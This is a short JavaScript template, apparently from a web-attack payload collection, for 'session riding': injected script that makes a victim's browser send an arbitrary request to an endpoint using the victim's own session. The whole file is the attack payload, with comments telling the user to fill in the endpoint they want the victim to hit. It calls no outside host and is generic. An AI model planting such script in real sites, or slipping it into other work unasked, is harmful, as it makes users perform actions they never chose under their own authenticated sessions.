// more generic template to perform an arbitrary request while session riding
var url = ""; // not needed if riding same domain

// optional, define based on needs of the endpoint you want the victim to perform
var uri = "/";
var query_string = "";

function make_request() {
    xhr = new XMLHttpRequest();
    xhr.open("GET", url + uri + query_string, true);
    xhr.send(null);
}

make_request();
